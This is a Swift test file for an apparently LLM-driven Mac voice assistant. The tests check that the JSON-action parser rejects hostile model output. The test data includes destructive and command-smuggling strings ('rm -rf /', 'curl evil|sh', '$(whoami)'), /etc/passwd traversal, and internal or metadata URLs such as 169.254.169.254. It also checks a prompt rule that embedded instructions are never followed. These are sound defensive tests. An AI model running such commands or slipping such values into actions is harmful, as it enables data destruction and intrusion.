import Foundation

/// The smart resolver: prompt, JSON validation (including hostile output), dates, fakes only.
enum RioSmartResolverTests {
    private static var utc: TimeZone { TimeZone(identifier: "UTC")! }
    private static var pacific: TimeZone { TimeZone(identifier: "America/Los_Angeles")! }
    /// Tuesday 2026-11-03 14:05:09 UTC.
    private static let now = Date(timeIntervalSince1970: 1_793_714_709)

    private static func parse(_ json: String, timeZone: TimeZone? = nil) -> [RioAction] {
        RioSmartResponseParser.actions(from: json, now: now, timeZone: timeZone ?? utc)
    }

    private struct FakeLLM: RioSmartLLMCompleting {
        let reply: Result<String, Error>
        func complete(system: String, user: String, maxOutputTokens: Int?) async throws -> String {
            try reply.get()
        }
    }

    private final class RecordingLLM: RioSmartLLMCompleting, @unchecked Sendable {
        var systems: [String] = []
        var users: [String] = []
        func complete(system: String, user: String, maxOutputTokens: Int?) async throws -> String {
            systems.append(system)
            users.append(user)
            return "{\"actions\":[]}"
        }
    }

    static func run() async {
        testValidActions()
        testEveryAllowedActionHasAnExample()
        testQuestionsBecomeAnswers()
        testHostileOutput()
        testDates()
        testShapes()
        testPrompt()
        testSelectionPrompts()
        testTextLimits()
        await testResolverGuards()
        await testClient()
    }

    private static func testValidActions() {
        ETest.eq(parse(#"{"actions":[{"action":"openApp","name":"Notes"}]}"#), [.openApp(name: "Notes")])
        ETest.eq(
            parse(#"{"actions":[{"action":"openApp","name":"Chrome"},{"action":"volume","mode":"set","level":30}]}"#),
            [.openApp(name: "Chrome"), .volume(.set(30))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"sendMessage","to":"Ali","body":"On my way"}]}"#),
            [.sendMessage(to: "Ali", body: "On my way")]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"window","placement":"leftHalf","appName":"Safari"}]}"#),
            [.window(WindowCommand(appName: "Safari", placement: .leftHalf))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"window","placement":"maximize"}]}"#),
            [.window(WindowCommand(appName: nil, placement: .maximize))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"openURL","url":"https://www.apple.com/mac"}]}"#),
            [.openURL(URL(string: "https://www.apple.com/mac")!)]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"createReminder","title":"Call Mom","due":"2026-11-04T15:00:00"}]}"#),
            [.createReminder(title: "Call Mom", due: Date(timeIntervalSince1970: 1_793_804_400))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"createReminder","title":"Buy milk"}]}"#),
            [.createReminder(title: "Buy milk", due: nil)]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"createEvent","title":"Lunch","start":"2026-11-06T13:00:00","durationMinutes":45}]}"#),
            [.createEvent(title: "Lunch", start: Date(timeIntervalSince1970: 1_793_970_000), durationMinutes: 45)]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"startTimer","seconds":300,"label":"pasta"}]}"#),
            [.startTimer(seconds: 300, label: "pasta")]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"selectionTask","task":"translate","language":"Arabic"}]}"#),
            [.selectionTask(.translate(language: "Arabic"))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"systemToggle","setting":"darkMode","isOn":true}]}"#),
            [.systemToggle(.darkMode, isOn: true)]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"brightness","mode":"set","level":50}]}"#),
            [.brightness(.set(50))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"clipboard","command":"pasteRecent","matching":"link"}]}"#),
            [.clipboard(.pasteRecent(matching: "link"))]
        )
        ETest.eq(
            parse(#"{"actions":[{"action":"readAloud","target":"page"}]}"#),
            [.readAloud(.page)]
        )
    }

    private static func testEveryAllowedActionHasAnExample() {
        let examples: [String] = [
            #"{"action":"openApp","name":"A"}"#, #"{"action":"quitApp","name":"A"}"#,
            #"{"action":"switchToApp","name":"A"}"#, #"{"action":"hideApp","name":"A"}"#,
            #"{"action":"openURL","url":"https://a.com"}"#, #"{"action":"webSearch","query":"q"}"#,
            #"{"action":"volume","mode":"up"}"#, #"{"action":"media","command":"next"}"#,
            #"{"action":"lockScreen"}"#, #"{"action":"screenshot","kind":"window"}"#,
            #"{"action":"doNotDisturb","isOn":true}"#, #"{"action":"window","placement":"center"}"#,
            #"{"action":"sendMessage","to":"A","body":"b"}"#, #"{"action":"createReminder","title":"t"}"#,
            #"{"action":"selectionTask","task":"summarize"}"#, #"{"action":"replyInConversation","body":"b"}"#,
            #"{"action":"readAloud","target":"selection"}"#, #"{"action":"answer","text":"Paris."}"#,
            #"{"action":"startTimer","seconds":60}"#, #"{"action":"cancelTimer"}"#,
            #"{"action":"timerStatus"}"#, #"{"action":"undoLast"}"#, #"{"action":"showHelp"}"#,
            #"{"action":"openFile","query":"resume"}"#, #"{"action":"revealFile","query":"resume"}"#,
            #"{"action":"calendarAgenda","range":"today"}"#, #"{"action":"joinNextMeeting"}"#,
            #"{"action":"createEvent","title":"t","start":"2026-11-05T10:00:00"}"#,
            #"{"action":"clipboard","command":"showHistory"}"#, #"{"action":"browser","command":"newTab"}"#,
            #"{"action":"systemToggle","setting":"wifi","isOn":false}"#, #"{"action":"brightness","mode":"up"}"#,
            #"{"action":"batteryStatus"}"#, #"{"action":"pressKeys","key":"n","modifiers":["command"]}"#,
            #"{"action":"describeScreen"}"#, #"{"action":"click","label":"Save"}"#,
            #"{"action":"fillField","label":"Email","text":"a@b.com"}"#, #"{"action":"runTask","goal":"rename my files"}"#,
            #"{"action":"remember","fact":"my pin is 99"}"#, #"{"action":"recall","query":"pin"}"#,
            #"{"action":"forget","query":"pin"}"#, #"{"action":"draftEmail","body":"Hi"}"#,
            #"{"action":"addNote","text":"milk"}"#, #"{"action":"calculate","expression":"2 plus 2"}"#,
            #"{"action":"startTranslation"}"#, #"{"action":"stopTranslation"}"#, #"{"action":"speakLastTranslation"}"#,
            #"{"action":"searchHistory","query":"the Hala pitch"}"#, #"{"action":"editLastDictation","instruction":"make it shorter"}"#,
            #"{"action":"writeForMe","instruction":"a thank-you note"}"#, #"{"action":"smartPaste","instruction":"as bullet points"}"#,
            #"{"action":"scheduleCommand","command":"open Warp and VS Code","when":"every weekday at 9 am"}"#,
            #"{"action":"addTrigger","command":"open VS Code and Warp","trigger":"display"}"#, #"{"action":"listAutomations"}"#,
            #"{"action":"removeAutomation","name":"morning"}"#, #"{"action":"recordMacro"}"#, #"{"action":"stopRecordingMacro"}"#,
            #"{"action":"runMacro","name":"standup"}"#, #"{"action":"findThing","query":"the lease PDF"}"#,
            #"{"action":"organizeDownloads"}"#, #"{"action":"copyTextFromScreen"}"#, #"{"action":"weather"}"#,
            #"{"action":"news","topic":"AI"}"#, #"{"action":"playMusic","query":"Fairuz"}"#,
            #"{"action":"notionAdd","text":"offline mode for the map","page":"Hala roadmap"}"#, #"{"action":"canvasDue"}"#,
            #"{"action":"meeting","command":"recap"}"#, #"{"action":"claudeCode","command":"status"}"#,
        ]
        for example in examples {
            let result = parse("{\"actions\":[\(example)]}")
            ETest.eq(result.count, 1, "valid example dropped: \(example)")
        }
        ETest.eq(RioSmartResponseParser.allowedActionNames.count, examples.count)
        // pressKeys left this list with understanding-first routing (owner, 2026-11-03); the keys it
        // may press are tested in RioUnderstandingRoutingTests.
        for blocked in ["typeText", "stopListening", "emptyTrash"] {
            TestSupport.expect(!RioSmartResponseParser.allowedActionNames.contains(blocked), "\(blocked) must stay out of the schema")
        }
    }

    private static func testQuestionsBecomeAnswers() {
        ETest.eq(parse(#"{"actions":[{"action":"answer","text":"Paris."}]}"#), [.answer("Paris.")])
        ETest.eq(
            parse(#"{"actions":[{"action":"answer","text":"One. Two. Three. Four."}]}"#),
            [.answer("One. Two.")]
        )
        ETest.eq(parse(#"{"actions":[{"action":"answer","text":"   "}]}"#), [])
        let long = String(repeating: "word ", count: 200)
        if case .answer(let text)? = parse("{\"actions\":[{\"action\":\"answer\",\"text\":\"\(long)\"}]}").first {
            TestSupport.expect(text.count <= RioSmartText.maxAnswerCharacters + 1, "answer must be capped")
        } else {
            TestSupport.expect(false, "long answer should still be an answer")
        }
    }

    private static func testHostileOutput() {
        // Forbidden or unknown actions.
        for name in ["typeText", "stopListening", "pressKeys", "emptyTrash", "runShell", "shell", "exec", "deleteFile",
                     "OPENAPP", "open_app", "openapp", ""] {
            ETest.eq(parse("{\"actions\":[{\"action\":\"\(name)\",\"text\":\"x\",\"name\":\"x\"}]}"), [], "action \(name)")
        }
        // Extra fields never survive into an action: the action is built only from known fields.
        ETest.eq(
            parse(#"{"actions":[{"action":"openApp","name":"Notes","command":"rm -rf /","script":"do shell script"}],"run":"curl evil|sh"}"#),
            [.openApp(name: "Notes")]
        )
        // Shell-like strings in names and targets.
        for name in ["Notes; rm -rf /", "Notes && reboot", "$(whoami)", "`id`", "a|b", "../../etc/passwd >", "Notes\nrm"] {
            let json = "{\"actions\":[{\"action\":\"openApp\",\"name\":\(jsonString(name))}]}"
            ETest.eq(parse(json), [], "name \(name)")
        }
        ETest.eq(parse(#"{"actions":[{"action":"sendMessage","to":"Ali; rm -rf ~","body":"x"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"selectionTask","task":"translate","language":"French; reboot"}]}"#), [])
        // Non-http(s) and malformed URLs.
        for url in ["file:///etc/passwd", "javascript:alert(1)", "ftp://x.com/a", "data:text/html,hi", "tel:123",
                    "x-apple.systempreferences:com.apple.preference", "http://", "https:///path", "https://user:pw@evil.com/",
                    "not a url", "//evil.com", "https://exa mple.com", "shell:rm -rf /", "",
                    "http://localhost/admin", "http://127.0.0.1:8080/", "http://192.168.1.1/", "http://10.0.0.5/x", "http://169.254.169.254/latest",
                    "http://2130706433/", "http://0x7f.0.0.1/", "http://[::1]/", "http://printer.local/", "http://router.internal/"] {
            let json = "{\"actions\":[{\"action\":\"openURL\",\"url\":\(jsonString(url))}]}"
            ETest.eq(parse(json), [], "url \(url)")
        }
        // Wrong types, out of range values, missing fields.
        ETest.eq(parse(#"{"actions":[{"action":"openApp","name":42}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"openApp"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"openApp","name":""}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"volume","mode":"set"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"volume","mode":"set","level":400}]}"#), [.volume(.set(100))])
        ETest.eq(parse(#"{"actions":[{"action":"volume","mode":"explode"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"brightness","mode":"mute"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"startTimer","seconds":0}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"startTimer","seconds":-5}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"startTimer","seconds":999999999}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"startTimer","seconds":"60"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"window","placement":"hyperspace"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"doNotDisturb","isOn":"yes"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"createEvent","title":"x","start":"someday"}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"createEvent","title":"x","start":"2026-11-05T10:00:00","durationMinutes":99999}]}"#), [])
        ETest.eq(parse(#"{"actions":[{"action":"createReminder","title":"x","due":"whenever"}]}"#), [])
        // Oversized and control characters.
        let huge = String(repeating: "a", count: 5000)
        ETest.eq(parse("{\"actions\":[{\"action\":\"sendMessage\",\"to\":\"Ali\",\"body\":\"\(huge)\"}]}"), [])
        ETest.eq(parse("{\"actions\":[{\"action\":\"openApp\",\"name\":\"\(huge)\"}]}"), [])
        ETest.eq(parse(#"{"actions":[{"action":"sendMessage","to":"Ali","body":"hi\u0000there"}]}"#), [])
        // One bad item does not poison good ones, and the batch is capped.
        ETest.eq(
            parse(#"{"actions":[{"action":"pressKeys"},{"action":"openApp","name":"Notes"},"junk",7,null]}"#),
            [.openApp(name: "Notes")]
        )
        let many = (0..<20).map { _ in #"{"action":"openApp","name":"Notes"}"# }.joined(separator: ",")
        ETest.eq(parse("{\"actions\":[\(many)]}").count, RioSmartResponseParser.maxActions)
    }

    private static func jsonString(_ text: String) -> String {
        let data = try! JSONSerialization.data(withJSONObject: [text])
        let array = String(data: data, encoding: .utf8)!
        return String(array.dropFirst().dropLast())
    }

    private static func testShapes() {
        ETest.eq(parse(""), [])
        ETest.eq(parse("I think you want Chrome"), [])
        ETest.eq(parse("{"), [])
        ETest.eq(parse("[]"), [])
        ETest.eq(parse(#"{"actions":"openApp"}"#), [])
        ETest.eq(parse(#"{"actions":[]}"#), [])
        ETest.eq(parse(#"{"nothing":1}"#), [])
        // Fenced, prefixed, think-tagged and bare shapes are tolerated.
        ETest.eq(parse("```json\n{\"actions\":[{\"action\":\"lockScreen\"}]}\n```"), [.lockScreen])
        ETest.eq(parse("Sure! {\"actions\":[{\"action\":\"lockScreen\"}]} Hope that helps."), [.lockScreen])
        ETest.eq(parse("<think>hmm {\"actions\":[]}</think>{\"actions\":[{\"action\":\"lockScreen\"}]}"), [.lockScreen])
        ETest.eq(parse(#"[{"action":"lockScreen"}]"#), [.lockScreen])
        ETest.eq(parse(#"{"action":"lockScreen"}"#), [.lockScreen])
    }

    private static func testDates() {
        ETest.eq(RioSmartDates.parse("2026-11-04T15:00:00", now: now, timeZone: utc), Date(timeIntervalSince1970: 1_793_804_400))
        ETest.eq(RioSmartDates.parse("2026-11-04T15:00", now: now, timeZone: utc), Date(timeIntervalSince1970: 1_793_804_400))
        ETest.eq(RioSmartDates.parse("2026-11-04T15:00:00Z", now: now, timeZone: pacific), Date(timeIntervalSince1970: 1_793_804_400))
        ETest.eq(RioSmartDates.parse("2026-11-04T07:00:00-08:00", now: now, timeZone: utc), Date(timeIntervalSince1970: 1_793_804_400))
        // No offset means the user's time zone (07:00 Pacific = 15:00 UTC).
        ETest.eq(RioSmartDates.parse("2026-11-04T07:00:00", now: now, timeZone: pacific), Date(timeIntervalSince1970: 1_793_804_400))
        ETest.eq(RioSmartDates.parse("2026-11-04T07:00:00.000-08:00", now: now, timeZone: utc), Date(timeIntervalSince1970: 1_793_804_400))
        // A bare date is 9:00 that day.
        ETest.eq(RioSmartDates.parse("2026-11-04", now: now, timeZone: utc), Date(timeIntervalSince1970: 1_793_782_800))
        for bad in ["", "tomorrow", "2026-13-40T10:00:00", "2026-02-30", "11/04/2026", "2026-11-04 3pm", "9999-01-01T00:00:00"] {
            ETest.eq(RioSmartDates.parse(bad, now: now, timeZone: utc), nil, "date \(bad)")
        }
        // Absurd past dates are rejected; yesterday is tolerated.
        ETest.eq(RioSmartDates.parse("2015-01-01T10:00:00", now: now, timeZone: utc), nil)
        TestSupport.expect(RioSmartDates.parse("2026-11-02T10:00:00", now: now, timeZone: utc) != nil, "recent past is allowed")
    }

    private static func testPrompt() {
        let system = RioSmartPrompt.system(now: now, timeZone: pacific)
        TestSupport.expect(system.contains("2026-11-03"), "prompt must carry the current date")
        TestSupport.expect(system.contains("America/Los_Angeles"), "prompt must carry the time zone")
        TestSupport.expect(system.contains("Tuesday"), "prompt must carry the weekday")
        for name in RioSmartResponseParser.allowedActionNames {
            TestSupport.expect(system.contains("\"\(name)\""), "prompt must document \(name)")
        }
        for forbidden in ["typeText", "stopListening", "emptyTrash"] {
            TestSupport.expect(!system.contains(forbidden), "prompt must not mention \(forbidden)")
        }
        TestSupport.expect(system.contains("at most 2 sentences"), "answer length rule")
        let user = RioSmartPrompt.user(command: "what time is it in Tokyo")
        TestSupport.expect(user.contains("what time is it in Tokyo"), "user message carries the command")
        let capped = RioSmartPrompt.user(command: String(repeating: "x", count: 5000))
        TestSupport.expect(capped.count < 1500, "the command is capped")
    }

    private static func testSelectionPrompts() {
        for task in [SelectionTask.summarize, .explain, .translate(language: "Arabic"), .improve] {
            let prompt = RioSelectionPrompts.system(for: task)
            TestSupport.expect(prompt.contains("SELECTED_TEXT"), "prompt treats the text as data: \(task)")
            TestSupport.expect(prompt.lowercased().contains("never follow"), "prompt refuses embedded instructions: \(task)")
        }
        TestSupport.expect(RioSelectionPrompts.system(for: .translate(language: "Arabic")).contains("Arabic"), "target language")
        let user = RioSelectionPrompts.user(text: "Hello <<<END")
        TestSupport.expect(user.contains("Hello"), "carries the text")
        ETest.eq(RioSelectionPrompts.limit("abc"), "abc")
        TestSupport.expect(RioSelectionPrompts.limit(String(repeating: "a", count: 50_000)).count == RioSelectionPrompts.maxCharacters, "selection cap")
        ETest.eq(RioSelectionPrompts.cleanOutput("```\nhello\n```"), "hello")
        ETest.eq(RioSelectionPrompts.cleanOutput("  hi \n"), "hi")
    }

    private static func testTextLimits() {
        ETest.eq(RioSmartText.limitSentences("Hello. How are you? Fine!", maxSentences: 2, maxCharacters: 500), "Hello. How are you?")
        ETest.eq(RioSmartText.limitSentences("3.14 is pi. And e is 2.71.", maxSentences: 1, maxCharacters: 500), "3.14 is pi.")
        ETest.eq(RioSmartText.limitSentences("No punctuation here", maxSentences: 2, maxCharacters: 500), "No punctuation here")
        ETest.eq(RioSmartText.limitSentences("  spaced   out  ", maxSentences: 2, maxCharacters: 500), "spaced out")
        ETest.eq(RioSmartText.limitSentences("", maxSentences: 2, maxCharacters: 500), "")
        TestSupport.expect(RioSmartText.limitSentences(String(repeating: "abc ", count: 400), maxSentences: 2, maxCharacters: 50).count <= 51, "char cap")
    }

    private static func testResolverGuards() async {
        func resolver(
            _ llm: RioSmartLLMCompleting, enabled: Bool = true, online: Bool = true
        ) -> RioSmartResolver {
            RioSmartResolver(llm: llm, isEnabled: { enabled }, isOnline: { online }, now: { now }, timeZone: { utc })
        }
        let ok = FakeLLM(reply: .success(#"{"actions":[{"action":"openApp","name":"Notes"}]}"#))
        let good = try? await resolver(ok).resolve("do the notes thing")
        ETest.eq(good, [.openApp(name: "Notes")])

        let offline = try? await resolver(ok, online: false).resolve("anything")
        ETest.eq(offline, [.answer(RioSmartMessages.offline)])
        TestSupport.expect(RioSmartMessages.offline.hasPrefix("I'm offline right now."), "offline copy")

        let disabled = try? await resolver(ok, enabled: false).resolve("anything")
        ETest.eq(disabled, [.answer(RioSmartMessages.disabled)])

        let failures: [Error] = [URLError(.timedOut), RioSmartLLMError.http(500), RioSmartLLMError.badResponse, URLError(.notConnectedToInternet)]
        for failure in failures {
            let result = try? await resolver(FakeLLM(reply: .failure(failure))).resolve("anything")
            ETest.eq(result, [.answer(RioSmartMessages.unreachable)], "\(failure)")
        }
        ETest.eq(RioSmartMessages.unreachable, "I couldn't reach my brain just now.")
        // A rate limit says so, truthfully, instead of "I couldn't reach my brain".
        let limited = try? await resolver(FakeLLM(reply: .failure(RioSmartLLMError.rateLimited(retryAfter: 7)))).resolve("x")
        ETest.eq(limited, [.answer(RioSmartMessages.rateLimited)])
        let daily = try? await resolver(FakeLLM(reply: .failure(RioSmartLLMError.rateLimited(retryAfter: 3_600)))).resolve("x")
        ETest.eq(daily, [.answer(RioSmartMessages.rateLimitedLong)])
        let unconfigured = try? await resolver(FakeLLM(reply: .failure(RioSmartLLMError.notConfigured))).resolve("x")
        ETest.eq(unconfigured, [.answer(RioSmartMessages.notConfigured)])

        let garbage = try? await resolver(FakeLLM(reply: .success("lol no"))).resolve("x")
        ETest.eq(garbage, [])

        // The prompt carries the date and the command, and nothing else leaves the Mac.
        let recorder = RecordingLLM()
        _ = try? await resolver(recorder).resolve("remind me tomorrow at 3 to call mom")
        ETest.eq(recorder.users.count, 1)
        TestSupport.expect(recorder.users[0].contains("remind me tomorrow at 3 to call mom"), "command sent")
        TestSupport.expect(recorder.systems[0].contains("2026-11-03"), "date sent")

        let blank = try? await resolver(recorder).resolve("   ")
        ETest.eq(blank, [])
        ETest.eq(recorder.users.count, 1, "blank text never reaches the LLM")
    }

    // MARK: Client

    private final class Capture: @unchecked Sendable {
        var request: URLRequest?
    }

    private static func chatReply(_ content: String) -> Data {
        let body: [String: Any] = ["choices": [["message": ["content": content]]]]
        return try! JSONSerialization.data(withJSONObject: body)
    }

    private static func response(_ request: URLRequest, status: Int) -> URLResponse {
        HTTPURLResponse(url: request.url!, statusCode: status, httpVersion: nil, headerFields: nil)!
    }

    private final class Calls: @unchecked Sendable {
        var count = 0
        var slept: [TimeInterval] = []
    }

    private static func limited(_ request: URLRequest, headers: [String: String]) -> URLResponse {
        HTTPURLResponse(url: request.url!, statusCode: 429, httpVersion: nil, headerFields: headers)!
    }

    /// A short 429 is waited out (as the provider asks) and retried once; a long or daily one,
    /// or a second 429, comes back as `.rateLimited` straight away.
    private static func testRateLimits(_ config: RioSmartLLMConfig) async {
        let calls = Calls()
        let recovers = RioSmartLLMClient(config: { config }, transport: { request in
            calls.count += 1
            if calls.count == 1 { return (Data(), limited(request, headers: ["retry-after": "1"])) }
            return (chatReply("ok"), response(request, status: 200))
        }, sleep: { calls.slept.append($0) })
        let text = try? await recovers.complete(system: "s", user: "u", maxOutputTokens: nil)
        ETest.eq(text, "ok", "a short 429 is retried once")
        ETest.eq(calls.count, 2)
        ETest.eq(calls.slept, [1], "it waits as long as retry-after says")

        let again = Calls()
        let stuck = RioSmartLLMClient(config: { config }, transport: { request in
            again.count += 1
            return (Data(), limited(request, headers: [:]))
        }, sleep: { again.slept.append($0) })
        do {
            _ = try await stuck.complete(system: "s", user: "u", maxOutputTokens: nil)
            TestSupport.expect(false, "a second 429 must throw")
        } catch {
            ETest.eq(error as? RioSmartLLMError, .rateLimited(retryAfter: RioSmartLLMClient.defaultRetryWait))
        }
        ETest.eq(again.count, 2, "only one retry")
        ETest.eq(again.slept, [RioSmartLLMClient.defaultRetryWait], "no header: a short default wait")

        let long = Calls()
        let longWait = RioSmartLLMClient(config: { config }, transport: { request in
            long.count += 1
            return (Data(), limited(request, headers: ["retry-after": "20"]))
        }, sleep: { long.slept.append($0) })
        do {
            _ = try await longWait.complete(system: "s", user: "u", maxOutputTokens: nil)
            TestSupport.expect(false, "a long 429 must throw")
        } catch {
            ETest.eq(error as? RioSmartLLMError, .rateLimited(retryAfter: 20))
        }
        ETest.eq(long.count, 1, "a long wait is not retried inside a spoken command")
        ETest.eq(long.slept, [])
    }

    private static func testClient() async {
        let capture = Capture()
        let config = RioSmartLLMConfig(apiKey: "test-key", baseURL: "https://provider.invalid/openai/v1/", model: "openai/gpt-oss-20b")
        let client = RioSmartLLMClient(config: { config }, timeout: 7, transport: { request in
            capture.request = request
            return (chatReply("hello"), response(request, status: 200))
        })
        let text = try? await client.complete(system: "SYS", user: "USR", maxOutputTokens: 300)
        ETest.eq(text, "hello")
        let request = capture.request
        ETest.eq(request?.url?.absoluteString, "https://provider.invalid/openai/v1/chat/completions")
        ETest.eq(request?.httpMethod, "POST")
        ETest.eq(request?.value(forHTTPHeaderField: "Authorization"), "Bearer test-key")
        ETest.eq(request?.timeoutInterval, 7)
        if let body = request?.httpBody, let json = try? JSONSerialization.jsonObject(with: body) as? [String: Any] {
            ETest.eq(json["model"] as? String, "openai/gpt-oss-20b")
            let messages = json["messages"] as? [[String: String]]
            ETest.eq(messages?.count, 2)
            ETest.eq(messages?.first?["role"], "system")
            ETest.eq(messages?.last?["content"], "USR")
        } else {
            TestSupport.expect(false, "request body must be JSON")
        }

        await testRateLimits(config)
        let failing = RioSmartLLMClient(config: { config }, transport: { request in
            (Data("nope".utf8), response(request, status: 500))
        })
        do {
            _ = try await failing.complete(system: "s", user: "u", maxOutputTokens: nil)
            TestSupport.expect(false, "HTTP 500 must throw")
        } catch {
            ETest.eq(error as? RioSmartLLMError, .http(500))
        }
        let malformed = RioSmartLLMClient(config: { config }, transport: { request in
            (Data("{}".utf8), response(request, status: 200))
        })
        do {
            _ = try await malformed.complete(system: "s", user: "u", maxOutputTokens: nil)
            TestSupport.expect(false, "bad body must throw")
        } catch {
            ETest.eq(error as? RioSmartLLMError, .badResponse)
        }
        let thinking = RioSmartLLMClient(
            config: { RioSmartLLMConfig(apiKey: "k", baseURL: "https://p.invalid/v1", model: "qwen/qwen3.8-27b") },
            transport: { request in (chatReply("<think>plan</think>answer"), response(request, status: 200)) }
        )
        let thought = try? await thinking.complete(system: "s", user: "u", maxOutputTokens: nil)
        ETest.eq(thought, "answer")

        let badConfigs = [
            RioSmartLLMConfig(apiKey: "", baseURL: "https://p.invalid/v1", model: "m"),
            RioSmartLLMConfig(apiKey: "k", baseURL: "file:///etc", model: "m"),
            RioSmartLLMConfig(apiKey: "k", baseURL: "not a url", model: "m"),
        ]
        for bad in badConfigs {
            let broken = RioSmartLLMClient(config: { bad }, transport: { request in
                (chatReply("x"), response(request, status: 200))
            })
            do {
                _ = try await broken.complete(system: "s", user: "u", maxOutputTokens: nil)
                TestSupport.expect(false, "bad config must throw")
            } catch {
                ETest.eq(error as? RioSmartLLMError, .notConfigured)
            }
        }
        let missing = RioSmartLLMClient(config: { nil }, transport: { request in (chatReply("x"), response(request, status: 200)) })
        do {
            _ = try await missing.complete(system: "s", user: "u", maxOutputTokens: nil)
            TestSupport.expect(false, "missing config must throw")
        } catch {
            ETest.eq(error as? RioSmartLLMError, .notConfigured)
        }
    }
}
